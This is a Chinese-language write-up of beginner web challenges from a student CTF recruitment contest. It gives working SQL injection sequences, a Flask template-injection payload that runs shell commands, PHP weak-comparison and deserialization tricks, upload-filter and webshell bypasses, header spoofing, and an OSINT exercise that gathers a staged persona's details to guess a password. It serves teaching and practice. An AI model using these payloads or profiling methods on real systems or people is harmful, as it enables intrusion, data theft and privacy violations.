## JotangCTF Writeup - Mtaun



>本来是不打算写的，感觉没什么好写的，后来发现把一个学长的题糊了之后还有点空闲时间，就顺手写一下好了



### 签到

签到题希望大家都认真看了，虽然招新赛没那么正规，难度也不大，但是养成一个**仔细阅读比赛规则和说明**的习惯还是要有的。

这个题 flag 很简单，hint 也给出来了，把 ZmxhZ3tIZWxsb19Kb3RhbmchfQ== 随便放到一个在线工具里或者自己写一个程序用 base64 解密就可以拿到 flag 。

#### flag

```
flag{Hello_Jotang!}
```



### NothingHere

因为不需要**任何形式**的爆破，先手 F12 就冲上去了。但这里还是可以多提一嘴，有些情况下网页并不准许使用鼠标右键和 F12 ，直接在 url 前面加上 view-source: 回车就好。

#### flag

```
flag{f12_yyds!_hmmmmm_Not_so_much...}
```



### GET&POST

#### 源码：

```php
<?php
show_source(__FILE__);
include ("flag.php");
$a=$_GET['a'];
$b=$_POST['b'];
if(isset($a)){
    if(isset($b)){
        echo $flag;
    }
}
?>
```

先不说 GET 和 POST ，php 相关的题目在 CTF 还蛮多的，花里胡哨的啥都有我这也不好总结（我完全没有暗示疯狂刷题的意思），但个人认为 php 最重要的就是**读懂代码，代码审计**（其他语言也是一样的），给出源码的题目如果连看都看不懂那就无了呀，当然也会遇到 “啊，这个语言我没学过，这个框架我不知道，完蛋了” 的情况，解决办法也很简单，现学啊hhhhhh，抛开 CTF 不说，突然被要求做一个自己完全不了解的东西的情况还有很多（相信大家在招新赛的其他题目中有所感受到），自学能力很重要。

说回题目，这个题要求用 GET 的方法获取一个任意的 a ，用 POST 的方法获取一个任意的 b ，做出来的人蛮多的我就不赘述什么是 GET ，什么是 POST 了，Hackbar 一把梭就好。

![0oIywQ.png](https://s1.ax1x.com/2020/10/15/0oIywQ.png)

#### flag

```
flag{very_bas1c_but_necessary}
```



### EasySQL

#### 信息收集

> sql 注入一定要确认数据库类型，注入点位置，注入类型，回显情况等一些基本线索或者信息，并以此来推断后端的逻辑，然后再进行后续的操作

提交数字 1 到 4 后会回显诗句，数字 5 以后error，其他单个符号和字母报错，回显：

```
error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
```

可以确定数据库用的是 **MySQL**

输入 1'  提交，回显：

```
check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

可以确定 **注入点** 以及类型是 **数字型注入**

可以猜测后端 sql 语句大概是

```
select * from poem where poetry = $inject;
```



#### 进一步的操作

#### 爆字段数量

输入 1 order by 1 和 1 order by 2 提交正常回显，输入 1 order by 3 提交报错，因此 **字段数量为 2**

<img src="https://s1.ax1x.com/2020/10/15/0oIgFs.png" alt="0oIgFs.png" style="zoom:67%;" />

#### 确认插入位置

输入 1 union select 1,2 可以看到回显诗句和另起一行的数字2，因此 **第二个位置可以插入sql语句**

<img src="https://s1.ax1x.com/2020/10/15/0oI6oj.png" alt="0oI6oj.png" style="zoom:67%;" />

#### 爆数据库名

输入 1 union select 1,database() 回显，因此 **当前数据库为easysql** 

<img src="https://s1.ax1x.com/2020/10/15/0oIseg.png" alt="0oIseg.png" style="zoom:67%;" />

#### 获取所有数据库名

输入 1 union select 1,group_concat(schema_name) from information_schema.schemata 回显，因此可以确定需要的东西就在easysql中

<img src="https://s1.ax1x.com/2020/10/15/0ooGcV.png" alt="0ooGcV.png" style="zoom:67%;" />



#### 爆表名

输入 1 union select 1,table_name from information_schema.tables where table_schema='easysql' 回显，因此 **flag 多半就在表 flaghere 中**

*一般最好用 group_concat() 包裹一下 table_name ，这里是我懒得加了，后面的 column_name 也是如此

<img src="https://s1.ax1x.com/2020/10/15/0ooD91.png" alt="0ooD91.png" style="zoom:67%;" />

#### 爆字段名

输入 1 union select 1,column_name from information_schema.columns where table_name='flaghere' 回显，因此 **只存在一个名为 flag 的字段**

<img src="https://s1.ax1x.com/2020/10/15/0oofNd.png" alt="0oofNd.png" style="zoom:67%;" />

#### 拿 flag

输入 1 union select 1,flag from flaghere 回显，拿到 flag

<img src="https://s1.ax1x.com/2020/10/15/0ooXNj.png" alt="0ooXNj.png" style="zoom:67%;" />



#### flag

```
flag{never_trust_user_input!}
```





### SheIsAlwaysTheBEST

> 了解 php 语言特性 ×
>
> 了解很多语言的特性 √

#### 源码：

```php
<?php
show_source(__FILE__);
include ("flag.php");
$a = $_GET['a'];
$b = $_GET['b'];
$c = $_POST['c'];
if (isset($a) & isset($b)) {
    if (ctype_alpha($a) & is_numeric($b) & md5((string)($a)) == md5((string)(($b)))) {
        if (isset($c)) {
            $c = json_decode($c);
            if ($c->key == $flag) {
                echo $flag;
            } else {
                echo 'Wrong c.<br>';
            }
        } else {
            echo 'give me a c.<br>';
        }
    } else {
        echo 'Wrong a or b.<br>';
    }
} else {
    echo 'give me a & b.<br>';
}
?>
```

本来是想从 old-rick 那个题扣一部分下来的，但那个题太阴间了想了想还是算了，整简单点好了。

不难看出主要在于两个点

#### 第一点

```
if (ctype_alpha($a) & is_numeric($b) & md5((string)($a)) == md5((string)(($b))))
```

要求 a 中所有字符只包含字母，b 只能是数字，a 和 b 的md5 值要**弱相等**

关键在于**php在通过"!="和"=="比较处理哈希字符串时，会把每一个以“0E”或“0e”开头的哈希值都解释为0**，因此只需要 md5(a) 和 md5(b) 的最终值以 0e 和 0E 开头就行，在网上不难找到 

MD5("240610708") == md5("QNKCDZO") 

#### 第二点

```
$c = json_decode($c);
if ($c->key == $flag)
```

要求 c 在通过 json 解码后要和 flag 相等，双等号就不赘述了，这种时候应该直接贴个这个图

![0TI3DS.png](https://s1.ax1x.com/2020/10/15/0TI3DS.png)

####  payload

![0ToQi9.png](https://s1.ax1x.com/2020/10/15/0ToQi9.png)

#### flag

```
flag{php_is_worthy_of_being_the_best!}
```



### IP&Referer

这里用 Burp Suite 演示好了，不要老用Hackbar嘛

首先题目要求请求端的 IP 为 1.1.1.1

<img src="https://s1.ax1x.com/2020/10/15/0ToTyV.png" alt="0ToTyV.png" style="zoom:50%;" />

在 HTTP 包中添加 X-Forwarded-For:1.1.1.1 后用 Reapter 发包。X-Forwarded-For 是一个 HTTP 扩展头部，用来表示 HTTP 请求端真实 IP。这里多一嘴，并不是改了这个东西，就真的识别不出来真实 IP 了

![0T7Qjx.png](https://s1.ax1x.com/2020/10/15/0T7Qjx.png)

然后发现告诉我们要求 Referer 为 www.doyouhaveagirlfriend.com

于是在 HTTP 包中添加 Referer:www.doyouhaveagirlfriend.com 后用 Reapter 发包，flag到手

![0T7rb8.png](https://s1.ax1x.com/2020/10/15/0T7rb8.png)

#### flag

```
flag{sometimes_can_fake_sometimes_cannot}
```



### EasyFLASK

> 不只有 flask

看页面描述让 POST 一个 name 进去，先试试呗

![07C8Nn.png](https://s1.ax1x.com/2020/10/15/07C8Nn.png)

可以看出传入什么，就会回显什么，同时根据题目 flask 的提示，猜测是 ssti ，后台可能存在类似下面的代码

```
render_template_string(name)
```

传 {{2*2}} ，回显 4，可以确认存在 ssti 

![07CIUA.png](https://s1.ax1x.com/2020/10/15/07CIUA.png)

这里我先给出最终的 payload ，然后再一节一节的分析，毕竟截图传图床很麻烦的

```
name={{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat flag.txt').read()}}
```

![07PM26.png](https://s1.ax1x.com/2020/10/15/07PM26.png)

```
# 获得一个字符串实例
""

# 获得字符串的type实例
"".__class__

# 获得其基类，当然你也可以用__mro__获得其父类
"".__class__.__bases__

# 获得基类中的object类
"".__class__.__bases__[0] 

# 使用__subclasses__()方法，获得object类的子类
"".__class__.__bases__[0] .__subclasses__()

# 获得第132个子类，<class 'os._wrap_close'>，当然还有更多的子类可以用，可以自己写一个程序来找，至于找索引的问题应该不需要我讲吧
"".__class__.__bases__[0] .__subclasses__()[132]

# 对os类进行init初始化，使用globals来获取所有的方法、变量、参数
"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__

# function popen读取文件
"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat flag').read()
```

#### flag

```
flag{flask_is_interesting_but_sometimes_dangerous}
```



### EasyUPLOAD

> 真的没有人传奇奇怪怪的图，可恶，我还以为会有什么好康的图呢

#### 源码：

```php
<?php
$oldname = $_FILES["file"]["name"];
$newname = preg_replace('/.+(\.[a-z]+)$/i', md5(time()) . '\1', $oldname);
if ((($_FILES["file"]["type"] == "image/gif") || ($_FILES["file"]["type"] == "image/jpeg") || ($_FILES["file"]["type"] == "image/jpg") || ($_FILES["file"]["type"] == "image/pjpeg") || ($_FILES["file"]["type"] == "image/x-png") || ($_FILES["file"]["type"] == "image/png")) && ($_FILES["file"]["size"] < 204800)) {
    if ($_FILES["file"]["error"] > 0) {
        die("错误：: " . $_FILES["file"]["error"] . "<br>");
    }
    if (file_exists("upload/" . $newname)) {
        die($newname . " 文件已存在");
    }
    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $newname);
    $alldata = file_get_contents("upload/" . $newname);
    echo $alldata;
    if (strpos($alldata, "<?php") !== false) {
        unlink("upload/" . $newname);
        die("臭弟弟，文件里写了啥呢");
    } else {
        echo "上传文件名: " . $newname . "<br>";
        echo "文件类型: " . $_FILES["file"]["type"] . "<br>";
        echo "文件存储在: " . "upload/" . $newname . "<br>";
    }
} else {
    die("臭弟弟，不是图片不收嗷");
}
?>
```

关于文件上传题，我个人的一般做法是先传一个正常的文件上去，先瞅瞅回显，然后尝试一点点的“让这个文件变得不正常”，来测试网站对上传文件的过滤程度，当然这是对于一般的文件上传题，还有类似于利用 .htaccess 和 .user.ini 绕过上传，上传 phar 文件触发反序列化等等，这里就不多讲了，感兴趣的可以自己去查查

在这个题中

MIME 的检测抓包直接改就行

<?php 的检测换一个不用这个的马就行

其实给出源码后还有一种做法，因为在这个部分

```php
move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $newname);
    $alldata = file_get_contents("upload/" . $newname);
    echo $alldata;
    if (strpos($alldata, "<?php") !== false) {
        unlink("upload/" . $newname);
        die("臭弟弟，文件里写了啥呢");
    }
```

是先生成了文件，再进行判断是否选择删除的，所以可以利用条件竞争漏洞，也就是“只要我访问的够快，删除文件就跟不上我”，当然这个题用不了这么麻烦

不用条件竞争的上传一句话之后，用菜刀用蚁剑连一下，就能看到flag了

#### flag

```
flag{check_everything_carefully:)}
```



**最后两个题就不细写了，提几个点就行，主要是我懒**

### SimpleSQL

#### 检测部分的源码：

```php
function waf($id) {
$id= preg_replace('/or/',"", $id);
$id= preg_replace('/[--]/',"", $id);
$id= preg_replace('/and/i',"", $id);
$id= preg_replace('/[=]/',"", $id);
$id= preg_replace('/[+]/',"", $id);
$id= preg_replace('/[\s]/',"", $id);
return $id;
}
```

preg_replace 导致 or 和 and 是可以双写绕过的

= 可以用 like 代替，如果 like 也被过滤了可以用 in 或者 between 或者用小于大于符号跑个程序都是可以的

空格可以用 /**/ 代替，如果注释被过滤了也可以考虑用括号，用换行等等

方法很多，可以慢慢收集各种花里胡哨的姿势

剩下的内容就和 easysql 没什么区别了

至于如何看出来过滤内容的，其实常规的测试语句通过报错内容就能看出来了



#### 2020.10.18 补充

补充一下，有同学问我为什么输入 username = jiji' anandd '1' = '2 和 password = wsfw 回显正常

首先，后端的 sql 语句是 select * from user where username = '\$username' and password = '\$password' ，如果按那样填写，再经过过滤，语句会变成 select * from user where username = 'jiji'and'1''2' and password = 'wsfw'，放在 mysql 里面测试（自己建一个数据库然后测试也是一种手段），确实不会报错，但是会有一个 warning ，所以返回的结果还是正常的

[<img src="https://s1.ax1x.com/2020/10/18/0XH8ER.png" alt="0XH8ER.png" style="zoom:80%;" />](https://imgchr.com/i/0XH8ER)

因为在 mysql 的标准中，引用字符串常量时需要用一对英文单引号或一对英文双引号将字符串常量括起来，所以如果在使用**一对英文单引号**包裹常量的情况下，如果字符串常量中需要包含单引号，就需要使用**两个单引号**，即 '' 或者**使用斜线加单引号**，即 \\' 来进行转义，所以在这个地方的 '1''2' 就会被识别成字符串 1'2 。

[<img src="https://s1.ax1x.com/2020/10/18/0XHT5q.png" alt="0XHT5q.png" style="zoom: 80%;" />](https://imgchr.com/i/0XHT5q)

肯定有人会问，这里 warning 里面说的是  INTERGER 类型啊？确实，确实是 INTERGER 类型，这个就要说到 mysql 的类型转换和 where 的本质了，where 实际上是把后面的条件判断完成后将结果转换成数字后和 0 进行判断的，所以 where '1''2' 是把 '1''2' 转换成了数字再进行判断，而本身 1'2 是一个字符串，mysql 对于字符串转数字的处理方式是针对**不满足数字正则的字符串**会取**最前面满足数字正则的部分**进行获取（同时会很生草的给个warning），就比如下面

[<img src="https://s1.ax1x.com/2020/10/18/0XLfKO.png" alt="0XLfKO.png" style="zoom:80%;" />](https://imgchr.com/i/0XLfKO)

所以 1'2 转换成数字后就是 1 ，where 恒为真，select 自然不会出毛病

为了验证这一点，测试 '0''1'，预期上这个字符串会被转换成数字 0 ，where 恒假，select 不会有任何结果，实际上通过测试我们发现确实如此

[![0XOMJ1.png](https://s1.ax1x.com/2020/10/18/0XOMJ1.png)](https://imgchr.com/i/0XOMJ1)

现在知道为什么那个回显正常了吧？



### SimplePHP

#### 源码：

```php
<?php

class MyDirectory {
    public $name; 
    public function __construct($name) {
        $this->name = $name;
    }
    public function __toString(){
        $num = count(scandir($this->name)); 
        if($num > 0){
            echo "count $num files"; 
        } else {        
            echo "flag path is /app/flag-{{md5}}"; 
            //only 8 bit
            //only num and lower case letters
            //flag filename is flag.php
        }
    }
}
 
class MyFile {
    public $name;
    public $user;
    public function __construct($name, $user) {
        $this->name = $name;
        $this->user = $user; 
    }
    public function __toString(){
        return file_get_contents($this->name);
    }

    public function __wakeup(){
        if(stristr($this->name, "flag")!==False) 
            $this->name = "/app/first";
        else
            $this->name = "/app/second"; 
        if(isset($_GET['user'])) {
            $this->user = $_GET['user']; 
        }
    }
    public function __destruct() {
        echo $this; 
    }
}
 
if(isset($_GET['input'])){
    $input = $_GET['input']; 

    if(stristr($input, 'user')!==False){
        die('Hacker'); 
    } else {
        unserialize($input);
    }
}else { 
    highlight_file(__FILE__);
}
?>
```

重点有两个

一个是怎么获取到 flag 文件所在的目录名

一个是怎么绕开 stristr 对 $this->name 的替换

对应的 hint 其实基本已经把这个题讲完了

分别的解决办法是

1、利用 **php glob://** 获取到 flag 文件所在的目录名

这里给一个 Example 体会一下它的作用

```php
<?php
// 循环 ext/spl/examples/ 目录里所有 *.php 文件
// 并打印文件名和文件尺寸
$it = new DirectoryIterator("glob://ext/spl/examples/*.php");
foreach($it as $f) {
    printf("%s: %.1FK\n", $f->getFilename(), $f->getSize()/1024);
}
?>
```

2、利用 **浅 copy** 绕开 stristr 对 $this->name 的替换

这个也给一个 Example 体会一下它的作用

```php
<?php

class Example
{
    public $name;

    public function __construct($name)
    {
        $this->name = $name;
    }
}

$ex1 = new Example('test1');

$ex2 = $ex1;

echo ('ex1:'.$ex1->name.'ex2:'.$ex2->name);

$ex2->name = 'test2';

echo "\r\n";
echo ('ex1:'.$ex1->name.'ex2:'.$ex2->name);
```

可以自己拿去跑一跑感受一下

剩下的就不说了



### 社会工程学

这个题纯粹就是出着玩，全靠群里的 **欧尼酱daisuki** 给的灵感，阿里嘎多

关键词：sipana、创作平台

创作平台不难找，就是简书，直接搜索 sipana 就能找到账户了

然后多看看就能找到，qq邮箱，生日的具体时间

然后访问 qq 空间能看到手机号

访问 qq 相册会有一个提示

最后收集到的线索就有

>用户名
>
>qq 号
>
>手机号
>
>生日
>
>密码组成
>
>存在冗余信息

既然我说不要破坏环境那多半是要登陆了，但是密码不好猜，猜不到很正常

这里给出更多的线索

1、手机号是冗余信息

2、数字一共8位，由两部分组成

3、存在大写字母

猜中了密码就请登陆账号进行下一步的探索；）

拿到 flag 后可以找我私聊，奖励是一道真实环境下的社工hhhhhhhhhh

（当然，猫猫和猫咖的照片都是真实的，翻相册翻到的，可惜中间有一次手机格式化，好多猫猫图都没了，落泪

（然后我的手机最近又格式化了一次，这波是所有的猫猫图都没了，我傻了